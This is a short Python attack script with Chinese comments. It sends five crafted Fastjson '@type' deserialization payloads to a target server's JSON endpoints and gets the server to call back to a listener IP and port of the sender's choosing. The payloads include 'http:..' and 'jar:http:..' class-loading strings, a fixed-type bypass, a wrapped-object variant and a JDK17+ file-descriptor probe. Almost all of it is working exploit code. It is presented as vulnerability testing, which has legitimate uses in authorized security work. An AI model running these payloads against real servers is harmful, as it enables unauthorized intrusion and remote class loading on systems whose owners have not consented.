#!/usr/bin/env python3
"""
fastjson_remote_callback.py
目标:  *.*.*.*:**** (Fastjson)
回调:  *.*.*.*:****     (你的监听服务器)
"""
import socket, struct, json, time
from urllib.request import Request, urlopen

TARGET = "http://*.*.*.*:****" #待测试的目标
CB_IP = "*.*.*.*"  #需要设置你的监听服务器 IP
CB_PORT = 7777        #需要设置你的监听服务器端口

# 将你的监听服务器 IP → 整数
cb_int = struct.unpack("!I", socket.inet_aton(CB_IP))[0]
print(f"[*] {CB_IP} → {cb_int}\n")

# 5 种 payload
payloads = [
    ("http:.. 直连",       "/parse",       {"\u0040type": f"http:..{cb_int}:{CB_PORT}.A"}),
    ("jar:http:.. SB",     "/parse",       {"\u0040type": f"jar:http:..{cb_int}:{CB_PORT}.x!.F.Exception"}),
    ("固定类型绕过",         "/parseObject", {"name":"t","\u0040type": f"http:..{cb_int}:{CB_PORT}.B"}),
    ("包装对象",            "/user/create", {"type":"u","data":{"\u0040type": f"http:..{cb_int}:{CB_PORT}.C"}}),
    ("FD 链探测(JDK17+)",  "/parse",       {"\u0040type": f"jar:file:.proc.self.fd.3!.fd3.Exception"}),
]

print(f"目标: {TARGET}")
print(f"回调: {CB_IP}:{CB_PORT}")
print(f"发送 {len(payloads)} 个 payload...\n")

for i, (name, endpoint, body) in enumerate(payloads, 1):
    data = json.dumps(body).encode()
    try:
        req = Request(f"{TARGET}{endpoint}", data=data,
                      headers={"Content-Type": "application/json"})
        resp = urlopen(req, timeout=8)
        print(f"  [{i}] ✓ {name:25s} → HTTP {resp.status}")
    except Exception as e:
        print(f"  [{i}] ✗ {name:25s} → {str(e)[:60]}")

print(f"\n{'='*50}")
print(f"去 {CB_IP}:{CB_PORT} 的终端看是否出现 '!!! 收到回调'")
print("有 → ⚠️ 漏洞存在")
print("无 → ✅ 未触发")
print(f"{'='*50}")
